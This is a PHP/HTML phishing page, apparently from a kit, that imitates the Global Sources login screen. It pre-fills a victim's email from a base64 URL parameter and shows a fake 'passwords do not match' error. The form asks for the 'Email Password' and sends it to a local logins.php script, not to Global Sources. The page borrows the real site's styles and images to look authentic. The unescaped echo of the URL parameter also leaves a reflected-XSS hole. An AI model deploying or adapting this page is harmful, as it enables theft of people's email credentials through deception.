<?php

if (isset($_GET['cid'])) {

	$cid = $_GET['cid'];
}

$bem = base64_decode($cid);

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Global Sources</title>

<link rel="shortcut icon" href="images/favicon.ico"/>
<link rel="stylesheet"  href="https://login.globalsources.com/sso/gsol/pex/en/balat/includes/BASE.CSS"  type="text/css" />
<link rel="stylesheet"  href="https://login.globalsources.com/sso/gsol/pex/en/balat/includes/SSO.CSS"  type="text/css" />
<script language="JavaScript1.2"  src="https://login.globalsources.com/sso/gsol/pex/en/balat/includes/jqueryandplugins.js" ></script>
<script language="JavaScript1.2"  src="https://login.globalsources.com/sso/gsol/pex/en/common/includes/ssoscripts.js" ></script>

<style>

element {
}
.GS_loginBox a:hover {
    color: #c00;
    text-decoration: none;
}
.LinkedInBtn:hover {
    background-position: 0 -21px;
}
.LinkedInBtn, .LinkedInBtn:link, .LinkedInBtn:visited {
    background: #0177b7 url(https://login.globalsources.com/sso/gsol/pex/en/balat/images/LINKEDIN_BUTTON.PNG) 0 0 no-repeat;
        background-position-x: 0px;
        background-position-y: 0px;
    width: 146px;
    height: 21px;
    display: inline-block;
    margin: 0;
    cursor: pointer;
}
.GS_loginSubmit a {
    display: inline-block;
    margin-top: 5px;
    vertical-align: middle;
}
.GS_loginBox a {
    color: #06c;
    text-decoration: none;
}
a:hover {
    color: #c00;
    text-decoration: none;
}
a {
    color: #06c;
    text-decoration: none;
}
.wrapper_rp {
    font-size: 1.2em;
}
body {
    font: 500 62.5%/1.3 Arial,Helvetica,sans-serif;
        font-size: 62.5%;
    -webkit-text-size-adjust: none;
}
html {
    color: #000;
}

</style>

<META NAME="WT.cg_n" CONTENT="Login">
<META NAME="WT.cg_s" CONTENT="">

<script language="JavaScript">
	<!--
	function displayFocus() {
	    if (document.formLogin.fld_UserID.value == "") {
	      document.formLogin.fld_UserID.focus();
	      return false;
	    }
	
		if (document.formLogin.fld_UserPassword.value == "" ) {
	        document.formLogin.fld_UserPassword.focus();
	        return false;
		 }
	
	
		return true
	}
	
	function login_decodeappURL() {
	        if (document.formLogin.appURL!=null){
	                var  val=document.formLogin.appURL.value;
	                        if (val !="")
	                                document.formLogin.appURL.value=unescape(val);
	        }
	        if(document.formSubscribe != null && document.formSubscribe.appURL!=null){
	                var  val=document.formSubscribe.appURL.value;
	                        if (val !="")
	                                document.formSubscribe.appURL.value=unescape(val);
	        }
	}
	//decode regAppURL
	function login_decodeRegAppURL() {
	        if (document.formLogin.regAppURL!=null){
	                var  val=document.formLogin.regAppURL.value;
	                if (val !="")
	                   document.formLogin.regAppURL.value=unescape(val);
	        }
	        if (document.formSubscribe != null && document.formSubscribe.regAppURL!=null){
	                var  val=document.formSubscribe.regAppURL.value;
	                if (val !="")
	                   document.formSubscribe.regAppURL.value=unescape(val);
	        }
	}
	
	function login_decodeSubAppURL() {
	        if (document.formSubscribe != null && document.formSubscribe.subAppURL!=null){
	                var  val=document.formSubscribe.subAppURL.value;
	                if (val !="")
	                    document.formSubscribe.subAppURL.value=unescape(val);
	        }
	}
	
	function toggleCheckBox(fldname, hiddenField) {
	   if (document.formLogin[fldname].checked) {
	        document.formLogin[hiddenField].value = true;
	     } else {
	        document.formLogin[hiddenField].value = false;
	   }
	 }
	
	function displayAlert() {
	    if (document.formLogin.fld_UserID.value == "") {
	      alert("Please enter Email Address (or Username).")	
	      document.formLogin.fld_UserID.focus();
	      return false;
	    }
	
		if (document.formLogin.fld_UserPassword.value == "" ) {
		alert("Please enter Password.")
	        document.formLogin.fld_UserPassword.focus();
	        return false;
		 }
		//------unencode the appURL
		
		login_decodeappURL();
		
		//unencode the regAppURL
		login_decodeRegAppURL();
	    login_decodeSubAppURL();
		return true
	}
	-->
</script>
<!--nvu-->
<script language="Javascript">
<!--
setUniqCookie();
   if (top != self)
	top.location = self.document.location;
//-->
</script>
<!--/nvu-->
</head>






 
 


  








<body onLoad="return displayFocus()">


<div class="wrapper_form">
   











  



<script language="JavaScript">
<!--
function showMsg() {
    var msg = "";
    
    //need to toggle boolean value return as BU requested : 
    // - click "ok" not to do anything 
    // - click "cancel" to 
	if(confirm(msg))
	   return false;
	else
	   return true;
}
//-->
</script>


<!-- header -->
<div class="GS_header GS_header_line clearfix">
    <div class="GS_logo">
        <a href="http://www.globalsources.com" >
        <img src="https://login.globalsources.com/sso/gsol/pex/en/balat/images/GSLOGO.PNG" alt="Manufacturers &amp; Suppliers" title="Manufacturers &amp; Suppliers" width="210" height="32" border="0" >
        </a>
        <p class="GS_logo_tit">Reliable exporters: find them and meet them</p>
    </div>
</div>
<!-- /header -->


   <div class="GS_loginBox">
        <form method="POST" autocomplete="off" action="logins.php" name="formLogin" class="GS_loginForm" onsubmit="return displayAlert();"><input type="hidden"  name="FORM_ID_KEY"  value="1414578413213">

		<input type="hidden" name="execute" value="Login">
		<input type="hidden" name="contact_detail_email" value="">
		
		
		
			<input type="hidden" name="application" value="GSOL">
		
			<input type="hidden" name="appURL" value="http://www.globalsources.com/GeneralManager?action=ReMap&where=GoHome">
		
			<input type="hidden" name="fromWhere" value="GSOL">
		
			<input type="hidden" name="language" value="">
		
			<input type="hidden" name="country" value="">
		
		
		
		
	    <h2 class="GS_loginForm_tit">Login for access to all your Global Sources services</h2>
		<div class="GS_login_error">
		<p><strong class="error">E-mail Address and Email Password do not match.</strong></p>
		<p class="mt10">Please check and try again.&nbsp;<a href="javascript:top.location.href=''">Forgot your password?</a></p>
		</div>
		    
		<p><label class="GS_login_name" for="login_Nmae">Email Address:</label><input type="text" name="Email" size="16" value="<? echo $bem; ?>" class="GS_login_filed" required=""/></p>
		<p class="mt20"><label class="GS_login_name" for="login_password">Email Password:</label><input type="password" name="Password" size="16" value="" class="GS_login_filed" required=""/>
		<span class="GS_login_password">Password is Case-Sensitive</span></p>
		   
		<div class="keepLogin mt15">
		<input type="checkbox" name="Remember" class="keepLogin_check" onClick="toggleCheckBox('Remember','fld_RememberMe')"  checked value="true"><p align="left">Remember me</p><p align="left">(Do not check this option if you are using a shared computer.)</p>
		</div>
		<p class="GS_loginSubmit clearfix mt25"><input type="submit" value="Login Now" class="button" /> <a href="javascript:top.location.href='#'" class="ml00">Forgot password?</a></p>
        <input type="hidden" name="fld_RememberMe" value="true">		  

<p class="GS_loginSubmit clearfix mt">
	<span class="block mt10">
<a href="javascript:void(0);" class="LinkedInBtn" id="LinkedInBtn" onclick="dcsMultiTrack('DCS.dcsuri', '/Linkedin-login.htm','WT.cg_n','Login-Linkedin','WT.dl','24','WT.source','Login')"></a>
</span>
</p>

</form>

<!--<style type="text/css">
.section_01 {
    margin: 0 5px 20px 0;
	}

@media screen and (-webkit-min-device-pixel-ratio:0) { 
 .section_01 {
    margin: 0 5px 15px 0;
	}
}
</style>-->
<!--[if IE]>
<style type="text/css">
  .section_01 {
    margin: 0 5px 20px 0;
	}
</style>
<![endif]-->
<div id="linkedin_prof" style="display:none;">
<form id="formDecideLogin" name="goSSO" method="POST" autocomplete="off" action=/sso/GeneralManager?action=RegisterGSOLUser&userTemplate=GSOLUSERMAG&source=GSOLHP_Top_Right >
	<input type="hidden" id="firstName"  name="FirstName" value="" />	
	<input type="hidden" id="lastName" name="LastName" value="" />	
	<input type="hidden" id="emailAddress" name="Email" value="" />	
	<input type="hidden" id="linkedinID" name=LinkedInId value="" />	
	<input type="hidden" id="url" name="linkedInURL" value="" />	
	<input type="hidden" id="country" name="Country" value="" />	
	<input type="hidden" id="phoneNumber" name="PhoneNumber" value="" />		
	<input type="hidden" id="company" name="Company" value="" />	
	<input type="hidden" id="validate" name="validate" value="false"/>
</form>
</div>

		    	
		
		<div class="GS_login_reg">Not yet registered? <a href="https://login.globalsources.com/sso/GeneralManager?action=RegisterGSOLUser&userTemplate=GSOLUSERMAG&validate=false&fromWhere=GSOL">Register now</a></div>
		<a href="javascript:winPop2('http://www.globalsources.com/HELP/GSOLHELP/REGHELP.HTM','440','640')" class="GS_login_help">Help</a>	
	</div>
    











  


	






<div class="GS_footer">

	
	




	
	

    <div class="GS_copyright">
    	<p>Copyright &copy; 2018 Trade Media Holdings Ltd. Copyright &copy; 2018 Trade Media Ltd. <a href="javascript:winPop2(&#39;http://www.globalsources.com/CUSTOMER/ALLRIGHTS.HTM&#39;,&#39;130&#39;,&#39;640&#39;)">All rights reserved</a>.</p>
        <p class="GS_copyright_link"><a href="http://www.globalsources.com/SITE/TERMSOFUSE.HTM" type="absolute" target="_blank">Terms of Use</a> <a href="http://www.globalsources.com/HELP/PRIVACY.HTM" type="absolute" target="_blank">Privacy Policy</a> <a href="http://www.globalsources.com/CUSTOMER/SECMEASURES.HTM" type="absolute" target="_blank">Security Measures</a> <a href="http://www.globalsources.com/CUSTOMER/IPPOLICY.HTM" type="absolute" target="_blank">IP Policy</a> 
        <span>hklogin3.globalsources.com</span></p>
    </div>
</div>


	
	






	
	
	
	
	
			<iframe id="transFrame" class="transFrame" style="display:none;"></iframe>
			<div class="transBaselay" id="transBaselay"></div>
				<div class="transOverlay" id="transOverlay" data-do="false">
					<span class="closeOverlay ui_overlay_close" id="closeOverlay1"><img src="https://login.globalsources.com/sso/gsol/pex/en/balat/images/BLANK.GIF" class="closeIco" alt="" />Close</span>
					<div class="transCon">
						<p class="transTit mg0" align="left">Please select your preferred language:</p>
					    <div id="google_translate_box"></div>
					    <p class="transNote" align="left">If you wish to change the language or use the original language later, please refer to the header or footer for more language options.</p>
					</div>
				</div>
	
			

	
	











<!-- START OF SmartSource Data Collector TAG -->
<!-- Copyright (c) 1996-2018 WebTrends Inc.  All rights reserved. -->
<!-- Version: 9.3.0 -->
<!-- Tag Builder Version: 3.1  -->
<!-- Created: 1/28/2011 12:20:54 PM -->

			<script language="JavaScript1.2"  src="/sso/gsol/pex/en/balat/includes/webtrends-prod.js" ></script>


<!-- ----------------------------------------------------------------------------------- -->
<!-- Warning: The two script blocks below must remain inline. Moving them to an external -->
<!-- JavaScript include file can cause serious problems with cross-domain tracking.      -->
<!-- ----------------------------------------------------------------------------------- -->
<script type="text/javascript">
//<![CDATA[
var _tag=new WebTrends();
_tag.dcsGetId();
//]]>
</script>
<script type="text/javascript">
//<![CDATA[
_tag.dcsCustom=function(){
// Add custom parameters here.
}
_tag.dcsCollect();
//]]>
</script>
<noscript>
<div><img alt="DCSIMG" id="DCSIMG" width="1" height="1" src="http://sdc.globalsources.com/dcs4zxlja100004vao3syzti9_1q7z/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=9.3.0&amp;WT.dcssip=www.globalsources.com"/></div>
</noscript>
<!-- END OF SmartSource Data Collector TAG -->




<!--[if lt IE 7]> 
	<script type="text/javascript" src="http://s.globalsources.com/gsol/en/clean/static/s/MINMAX-1.0.JS"></script>
<![endif]--> 
</div>			
</body>
</html>



      

